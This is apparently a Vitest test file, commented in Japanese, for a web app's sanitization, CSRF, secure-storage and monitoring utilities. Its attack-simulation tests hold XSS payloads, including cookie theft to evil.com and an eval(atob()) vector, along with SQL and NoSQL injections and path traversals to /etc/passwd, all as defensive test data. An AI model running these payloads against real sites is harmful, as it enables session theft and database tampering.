/**
 * セキュリティシステムの包括的テスト
 * 全セキュリティ機能の動作確認とセキュリティテストケース
 */

import { describe, test, expect, beforeEach, afterEach, vi } from 'vitest'
import { 
  sanitizeInput, 
  validateNumber, 
  generateSecureRandomString, 
  generateCSRFToken,
  validateCSRFToken,
  secureLocalStorage,
  generateSecureHash
} from '../../utils/security'
import { 
  SecurityMonitor,
  validateInputDepth,
  initializeSecurity
} from '../../utils/security-extensions'
import { 
  XSSProtection,
  CSRFProtection,
  CSPManager,
  SecurityInterceptor
} from '../../utils/xss-csrf-protection'
import { SecurityAuditLogger } from '../../utils/security-audit-logger'

// モック設定
const mockLocalStorage = (() => {
  let store: Record<string, string> = {}
  return {
    getItem: (key: string) => store[key] || null,
    setItem: (key: string, value: string) => { store[key] = value },
    removeItem: (key: string) => { delete store[key] },
    clear: () => { store = {} },
    length: Object.keys(store).length,
    key: (index: number) => Object.keys(store)[index] || null
  }
})()

Object.defineProperty(window, 'localStorage', { value: mockLocalStorage })
Object.defineProperty(window, 'crypto', {
  value: {
    getRandomValues: vi.fn((arr: Uint8Array) => {
      for (let i = 0; i < arr.length; i++) {
        arr[i] = Math.floor(Math.random() * 256)
      }
      return arr
    }),
    subtle: {
      digest: vi.fn(async (algorithm: string, data: ArrayBuffer) => {
        // 簡易ハッシュシミュレーション
        const view = new Uint8Array(data)
        const hash = new ArrayBuffer(32)
        const hashView = new Uint8Array(hash)
        for (let i = 0; i < 32; i++) {
          hashView[i] = (view[i % view.length] + i) % 256
        }
        return hash
      }),
      importKey: vi.fn(async () => ({})),
      sign: vi.fn(async () => new ArrayBuffer(32))
    }
  }
})

describe('Security System Tests', () => {
  beforeEach(() => {
    mockLocalStorage.clear()
    vi.clearAllMocks()
  })

  afterEach(() => {
    mockLocalStorage.clear()
  })

  describe('Input Sanitization Tests', () => {
    test('基本的なXSS攻撃パターンをブロック', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '"><script>alert(1)</script>',
        "';alert('XSS');//",
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<select onfocus="alert(1)" autofocus>'
      ]

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('javascript:')
        expect(sanitized).not.toContain('onload')
        expect(sanitized).not.toContain('onerror')
        expect(sanitized).not.toContain('onfocus')
        expect(sanitized).not.toContain('alert')
      })
    })

    test('SQL Injectionパターンをブロック', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM passwords --",
        "admin'--",
        "' OR 1=1 #",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ]

      sqlInjections.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toContain('DROP')
        expect(sanitized).not.toContain('UNION')
        expect(sanitized).not.toContain('INSERT')
        expect(sanitized).not.toContain('--')
        expect(sanitized).not.toContain("'")
      })
    })

    test('適切な入力値は保持される', () => {
      const validInputs = [
        'Hello World',
        '日本語テキスト',
        'user@example.com',
        '1234567890',
        'Valid text with spaces and punctuation.'
      ]

      validInputs.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized.length).toBeGreaterThan(0)
        expect(sanitized).toContain(input.replace(/[<>"'&]/g, ''))
      })
    })

    test('長すぎる入力値は切り詰められる', () => {
      const longInput = 'A'.repeat(2000)
      const sanitized = sanitizeInput(longInput)
      expect(sanitized.length).toBeLessThanOrEqual(1000)
    })
  })

  describe('Number Validation Tests', () => {
    test('有効な数値を正しく検証', () => {
      expect(validateNumber(42, 0, 100)).toBe(42)
      expect(validateNumber('42', 0, 100)).toBe(42)
      expect(validateNumber(3.14, 0, 10, true)).toBe(3.14)
      expect(validateNumber('3.14', 0, 10, true)).toBe(3.14)
    })

    test('無効な数値を拒否', () => {
      expect(validateNumber('abc', 0, 100)).toBeNull()
      expect(validateNumber(null, 0, 100)).toBeNull()
      expect(validateNumber(undefined, 0, 100)).toBeNull()
      expect(validateNumber(150, 0, 100)).toBeNull()
      expect(validateNumber(-10, 0, 100)).toBeNull()
      expect(validateNumber(3.14, 0, 10, false)).toBeNull() // float not allowed
    })

    test('危険な数値パターンを拒否', () => {
      expect(validateNumber('1e100', 0, 1000)).toBeNull() // 指数表記
      expect(validateNumber('123456789012345678901234567890', 0, 1000000)).toBeNull() // 異常に長い
      expect(validateNumber(Infinity, 0, 1000)).toBeNull()
      expect(validateNumber(NaN, 0, 1000)).toBeNull()
    })
  })

  describe('Secure Random Generation Tests', () => {
    test('セキュアなランダム文字列を生成', () => {
      const random1 = generateSecureRandomString(32)
      const random2 = generateSecureRandomString(32)
      
      expect(random1).toHaveLength(32)
      expect(random2).toHaveLength(32)
      expect(random1).not.toBe(random2)
      expect(random1).toMatch(/^[A-Za-z0-9_-]+$/)
    })

    test('不適切な長さパラメータを拒否', () => {
      expect(() => generateSecureRandomString(0)).toThrow()
      expect(() => generateSecureRandomString(-1)).toThrow()
      expect(() => generateSecureRandomString(1000)).toThrow()
    })
  })

  describe('CSRF Protection Tests', () => {
    test('CSRFトークンの生成と検証', () => {
      const token1 = generateCSRFToken()
      const token2 = generateCSRFToken()
      
      expect(token1).toHaveLength(32)
      expect(token2).toHaveLength(32)
      expect(token1).not.toBe(token2)
      
      expect(validateCSRFToken(token1, token1)).toBe(true)
      expect(validateCSRFToken(token1, token2)).toBe(false)
      expect(validateCSRFToken('invalid', token1)).toBe(false)
    })

    test('CSRF Protection クラスの機能', async () => {
      const csrfProtection = CSRFProtection.getInstance()
      
      // トークン生成
      const token = csrfProtection.generateTokenForAction('test_action')
      expect(token).toHaveLength(32)
      
      // 有効なトークンの検証
      expect(csrfProtection.validateTokenForAction('test_action', token)).toBe(true)
      
      // 無効なトークンの検証
      expect(csrfProtection.validateTokenForAction('test_action', 'invalid')).toBe(false)
      
      // 存在しないアクションの検証
      expect(csrfProtection.validateTokenForAction('nonexistent', token)).toBe(false)
    })
  })

  describe('Secure Storage Tests', () => {
    test('データの暗号化保存と復号読み込み', async () => {
      const storage = secureLocalStorage()
      const testData = { message: 'Hello, World!', number: 42 }
      
      await storage.setItem('test_key', testData, true) // 暗号化
      const retrieved = await storage.getItem('test_key', true) // 復号
      
      expect(retrieved).toEqual(testData)
    })

    test('データ改ざんの検出', async () => {
      const storage = secureLocalStorage()
      const testData = { important: 'data' }
      
      await storage.setItem('test_key', testData)
      
      // ストレージのデータを直接改ざん
      const corruptedData = 'corrupted_data'
      mockLocalStorage.setItem('test_key', corruptedData)
      
      // 改ざんが検出されnullが返される
      const retrieved = await storage.getItem('test_key')
      expect(retrieved).toBeNull()
    })

    test('バージョン管理機能', async () => {
      const storage = secureLocalStorage()
      const testData = { version: 1 }
      
      await storage.setItem('versioned_key', testData)
      
      // バージョン情報が保存される
      expect(mockLocalStorage.getItem('versioned_key_version')).toBeTruthy()
      expect(mockLocalStorage.getItem('versioned_key_timestamp')).toBeTruthy()
    })
  })

  describe('XSS Protection Tests', () => {
    test('XSSProtection クラスの HTML サニタイゼーション', () => {
      const xssProtection = XSSProtection.getInstance()
      
      const maliciousHTML = '<script>alert("XSS")</script><p>Safe content</p>'
      const sanitized = xssProtection.sanitizeHTML(maliciousHTML)
      
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).toContain('Safe content')
    })

    test('JavaScript文字列のエスケープ', () => {
      const xssProtection = XSSProtection.getInstance()
      
      const dangerousJS = 'alert("Hello"); console.log("test");'
      const escaped = xssProtection.escapeJavaScript(dangerousJS)
      
      expect(escaped).toContain('\\"')
      expect(escaped).not.toContain('"Hello"')
    })

    test('URLの安全性検証', () => {
      const xssProtection = XSSProtection.getInstance()
      
      // 安全なURL
      expect(xssProtection.sanitizeURL('https://example.com')).toBe('https://example.com/')
      expect(xssProtection.sanitizeURL('mailto:test@example.com')).toBe('mailto:test@example.com')
      
      // 危険なURL
      expect(xssProtection.sanitizeURL('javascript:alert(1)')).toBe('')
      expect(xssProtection.sanitizeURL('data:text/html,<script>alert(1)</script>')).toBe('')
      expect(xssProtection.sanitizeURL('file:///etc/passwd')).toBe('')
    })
  })

  describe('Input Depth Validation Tests', () => {
    test('適切な深度のオブジェクトを許可', () => {
      const validObject = {
        level1: {
          level2: {
            level3: 'data'
          }
        }
      }
      
      expect(validateInputDepth(validObject, 5)).toBe(true)
    })

    test('深すぎるオブジェクトを拒否', () => {
      const deepObject: any = {}
      let current = deepObject
      
      // 15レベルの深さを作成
      for (let i = 0; i < 15; i++) {
        current.nested = {}
        current = current.nested
      }
      
      expect(validateInputDepth(deepObject, 10)).toBe(false)
    })

    test('循環参照を検出', () => {
      const circularObject: any = { name: 'parent' }
      circularObject.self = circularObject
      
      expect(validateInputDepth(circularObject, 10)).toBe(false)
    })

    test('大きすぎる配列を拒否', () => {
      const largeArray = new Array(15000).fill('data')
      
      expect(validateInputDepth(largeArray, 10)).toBe(false)
    })
  })

  describe('Security Monitor Tests', () => {
    test('不審な活動のログ記録', () => {
      const monitor = SecurityMonitor.getInstance()
      const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})
      
      monitor.logSuspiciousActivity({
        type: 'test_threat',
        description: 'Test security threat',
        severity: 'high',
        source: 'test_source',
        metadata: { test: true }
      })
      
      const activities = monitor.getSuspiciousActivities(10)
      expect(activities).toHaveLength(1)
      expect(activities[0].type).toBe('test_threat')
      expect(activities[0].severity).toBe('high')
      
      expect(consoleSpy).toHaveBeenCalled()
      consoleSpy.mockRestore()
    })

    test('レート制限の機能', () => {
      const monitor = SecurityMonitor.getInstance()
      
      // 最初の試行は成功
      expect(monitor.checkRateLimit('test_key', 3, 60000)).toBe(true)
      expect(monitor.checkRateLimit('test_key', 3, 60000)).toBe(true)
      expect(monitor.checkRateLimit('test_key', 3, 60000)).toBe(true)
      
      // 制限を超えると失敗
      expect(monitor.checkRateLimit('test_key', 3, 60000)).toBe(false)
    })

    test('セキュリティレポートの生成', () => {
      const monitor = SecurityMonitor.getInstance()
      
      // いくつかの活動をログ
      monitor.logSuspiciousActivity({
        type: 'xss_attempt',
        description: 'XSS attempt blocked',
        severity: 'high',
        source: 'input_validator'
      })
      
      monitor.logSuspiciousActivity({
        type: 'rate_limit_exceeded',
        description: 'Rate limit exceeded',
        severity: 'medium',
        source: 'rate_limiter'
      })
      
      const report = monitor.generateSecurityReport()
      
      expect(report.totalActivities).toBeGreaterThan(0)
      expect(report.typeBreakdown).toHaveProperty('xss_attempt')
      expect(report.typeBreakdown).toHaveProperty('rate_limit_exceeded')
      expect(report.severityBreakdown).toHaveProperty('high')
      expect(report.severityBreakdown).toHaveProperty('medium')
      expect(report.recommendations).toBeInstanceOf(Array)
    })
  })

  describe('Security Audit Logger Tests', () => {
    test('セキュリティイベントのログ記録', async () => {
      const auditLogger = SecurityAuditLogger.getInstance()
      
      await auditLogger.logSecurityEvent(
        'test_event',
        'medium',
        'test_source',
        'Test security event',
        { testData: true }
      )
      
      const stats = await auditLogger.getStatistics()
      expect(stats.queueSize).toBeGreaterThan(0)
    })

    test('監査レポートの生成', async () => {
      const auditLogger = SecurityAuditLogger.getInstance()
      
      await auditLogger.logSecurityEvent(
        'test_event_1',
        'high',
        'test_source',
        'Test security event 1'
      )
      
      await auditLogger.logSecurityEvent(
        'test_event_2',
        'low',
        'test_source',
        'Test security event 2'
      )
      
      const report = await auditLogger.generateAuditReport()
      
      expect(report.summary.totalEvents).toBeGreaterThan(0)
      expect(report.topEventTypes).toBeInstanceOf(Array)
      expect(report.recommendations).toBeInstanceOf(Array)
    })
  })

  describe('Integration Tests', () => {
    test('セキュリティシステムの初期化', () => {
      const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {})
      
      // セキュリティシステムの初期化
      expect(() => initializeSecurity()).not.toThrow()
      
      consoleSpy.mockRestore()
    })

    test('複数のセキュリティ機能の連携', async () => {
      const xssProtection = XSSProtection.getInstance()
      const csrfProtection = CSRFProtection.getInstance()
      const monitor = SecurityMonitor.getInstance()
      
      // XSS攻撃の試行
      const maliciousInput = '<script>alert("XSS")</script>'
      const sanitized = xssProtection.sanitizeHTML(maliciousInput)
      expect(sanitized).not.toContain('<script>')
      
      // CSRF保護
      const csrfToken = csrfProtection.generateTokenForAction('test')
      expect(csrfProtection.validateTokenForAction('test', csrfToken)).toBe(true)
      
      // セキュリティ監視
      monitor.logSuspiciousActivity({
        type: 'integration_test',
        description: 'Integration test completed',
        severity: 'low',
        source: 'integration_test'
      })
      
      const activities = monitor.getSuspiciousActivities(5)
      expect(activities.length).toBeGreaterThan(0)
    })

    test('セキュアストレージとモニタリングの連携', async () => {
      const storage = secureLocalStorage()
      const monitor = SecurityMonitor.getInstance()
      
      // データ保存
      await storage.setItem('secure_data', { sensitive: 'information' }, true)
      
      // データ取得
      const retrieved = await storage.getItem('secure_data', true)
      expect(retrieved).toEqual({ sensitive: 'information' })
      
      // モニタリング確認
      const activities = monitor.getSuspiciousActivities()
      expect(activities.length).toBeGreaterThan(0)
    })
  })

  describe('Attack Simulation Tests', () => {
    test('XSS攻撃シミュレーション', () => {
      const attackVectors = [
        '<script>document.cookie="hacked=true"</script>',
        '<img src="x" onerror="fetch(\'/steal?data=\'+document.cookie)">',
        '<svg onload="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
        '<iframe src="javascript:parent.postMessage(\'XSS\',\'*\')"></iframe>',
        '<input autofocus onfocus="window.location=\'http://evil.com?cookie=\'+document.cookie">'
      ]
      
      attackVectors.forEach((vector, index) => {
        const sanitized = sanitizeInput(vector)
        expect(sanitized).not.toContain('script')
        expect(sanitized).not.toContain('javascript:')
        expect(sanitized).not.toContain('eval')
        expect(sanitized).not.toContain('onload')
        expect(sanitized).not.toContain('onerror')
        expect(sanitized).not.toContain('onfocus')
      })
    })

    test('SQL Injectionシミュレーション', () => {
      const sqlInjections = [
        "admin'; DROP TABLE users; --",
        "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "'; INSERT INTO admins (username, password) VALUES ('hacker', 'password'); --",
        "' UNION SELECT username, password FROM secret_table --",
        "admin'/**/OR/**/1=1#"
      ]
      
      sqlInjections.forEach(injection => {
        const sanitized = sanitizeInput(injection)
        expect(sanitized).not.toContain('DROP')
        expect(sanitized).not.toContain('INSERT')
        expect(sanitized).not.toContain('UPDATE')
        expect(sanitized).not.toContain('UNION')
        expect(sanitized).not.toContain('--')
        expect(sanitized).not.toContain('/*')
        expect(sanitized).not.toContain("'")
      })
    })

    test('NoSQL Injectionシミュレーション', () => {
      const noSqlInjections = [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
        '{"username": {"$exists": true}}',
        '{"$or": [{"username": "admin"}, {"username": "root"}]}'
      ]
      
      noSqlInjections.forEach(injection => {
        const sanitized = sanitizeInput(injection)
        expect(sanitized).not.toContain('$ne')
        expect(sanitized).not.toContain('$regex')
        expect(sanitized).not.toContain('$where')
        expect(sanitized).not.toContain('$exists')
        expect(sanitized).not.toContain('$or')
      })
    })

    test('Path Traversalシミュレーション', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ]
      
      pathTraversals.forEach(path => {
        const sanitized = sanitizeInput(path)
        expect(sanitized).not.toContain('../')
        expect(sanitized).not.toContain('..\\')
        expect(sanitized).not.toContain('%2e')
        expect(sanitized).not.toContain('%2f')
        expect(sanitized).not.toContain('passwd')
      })
    })
  })

  describe('Performance Impact Tests', () => {
    test('大量データ処理時のパフォーマンス', async () => {
      const startTime = performance.now()
      
      // 1000個のセキュリティイベントを処理
      const promises = []
      for (let i = 0; i < 1000; i++) {
        const maliciousInput = `<script>alert(${i})</script>`
        promises.push(Promise.resolve(sanitizeInput(maliciousInput)))
      }
      
      await Promise.all(promises)
      
      const endTime = performance.now()
      const duration = endTime - startTime
      
      // 1秒以内で処理完了すること
      expect(duration).toBeLessThan(1000)
    })

    test('メモリ使用量の監視', () => {
      const monitor = SecurityMonitor.getInstance()
      const initialActivities = monitor.getSuspiciousActivities().length
      
      // 大量のイベントを生成
      for (let i = 0; i < 2000; i++) {
        monitor.logSuspiciousActivity({
          type: 'performance_test',
          description: `Performance test event ${i}`,
          severity: 'low',
          source: 'performance_test'
        })
      }
      
      const finalActivities = monitor.getSuspiciousActivities().length
      
      // メモリ制限により、すべてのイベントが保持されないことを確認
      expect(finalActivities).toBeLessThanOrEqual(initialActivities + 1000)
    })
  })

  describe('Edge Cases and Error Handling', () => {
    test('null/undefined入力の処理', () => {
      expect(() => sanitizeInput(null as any)).toThrow()
      expect(() => sanitizeInput(undefined as any)).toThrow()
      expect(validateNumber(null, 0, 100)).toBeNull()
      expect(validateNumber(undefined, 0, 100)).toBeNull()
    })

    test('異常なデータ型の処理', () => {
      const weirdInputs = [
        {},
        [],
        () => {},
        Symbol('test'),
        new Date(),
        /regex/
      ]
      
      weirdInputs.forEach(input => {
        expect(() => sanitizeInput(input as any)).toThrow()
      })
    })

    test('ストレージエラーの処理', async () => {
      const storage = secureLocalStorage()
      
      // 保存時のエラー処理
      const mockError = vi.spyOn(mockLocalStorage, 'setItem').mockImplementation(() => {
        throw new Error('Storage full')
      })
      
      await expect(storage.setItem('test', 'data')).rejects.toThrow()
      
      mockError.mockRestore()
    })

    test('crypto API が利用できない場合のフォールバック', () => {
      // crypto APIを一時的に無効化
      const originalCrypto = window.crypto
      delete (window as any).crypto
      
      const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})
      
      // フォールバック実装が動作することを確認
      const randomString = generateSecureRandomString(16)
      expect(randomString).toHaveLength(16)
      expect(consoleSpy).toHaveBeenCalled()
      
      // crypto APIを復元
      window.crypto = originalCrypto
      consoleSpy.mockRestore()
    })
  })
})

describe('Real-world Security Scenarios', () => {
  test('フォーム送信の包括的検証', async () => {
    const interceptor = SecurityInterceptor.getInstance()
    
    // モックフォーム作成
    const mockForm = document.createElement('form')
    mockForm.setAttribute('data-action', 'user_registration')
    
    const usernameInput = document.createElement('input')
    usernameInput.name = 'username'
    usernameInput.value = 'testuser<script>alert(1)</script>'
    mockForm.appendChild(usernameInput)
    
    const passwordInput = document.createElement('input')
    passwordInput.name = 'password'
    passwordInput.value = 'password123'
    mockForm.appendChild(passwordInput)
    
    // CSRFトークンを生成
    const csrfProtection = CSRFProtection.getInstance()
    const csrfToken = csrfProtection.generateTokenForAction('user_registration')
    
    // フォーム検証
    const isValid = interceptor.validateFormSubmission(mockForm, csrfToken)
    
    // XSSが検出されるが、フォーム全体としては処理される
    expect(typeof isValid).toBe('boolean')
  })

  test('AJAX リクエストの検証', () => {
    const interceptor = SecurityInterceptor.getInstance()
    
    const validRequest = interceptor.validateAjaxRequest(
      'https://api.example.com/users',
      'POST',
      { 'X-CSRF-Token': 'valid-token', 'Content-Type': 'application/json' },
      { username: 'testuser', email: 'test@example.com' }
    )
    
    expect(typeof validRequest).toBe('boolean')
    
    // 危険なURLのテスト
    const maliciousRequest = interceptor.validateAjaxRequest(
      'javascript:alert(1)',
      'POST',
      {},
      {}
    )
    
    expect(maliciousRequest).toBe(false)
  })

  test('セッション管理のセキュリティ', async () => {
    // SecureSessionクラスの実際の使用例をテスト
    const { SecureSession } = await import('../../utils/security')
    const session = SecureSession.getInstance()
    
    // セッション開始
    session.startSession(30) // 30分
    
    // セッションの有効性確認
    expect(await session.isSessionValid()).toBe(true)
    
    // CSRFトークン取得
    const csrfToken = session.getCSRFToken()
    expect(csrfToken).toBeTruthy()
    expect(typeof csrfToken).toBe('string')
    
    // セッション更新
    session.refreshSession(60) // 60分延長
    expect(await session.isSessionValid()).toBe(true)
    
    // セッション終了
    session.endSession()
    expect(session.getCSRFToken()).toBeNull()
  })
})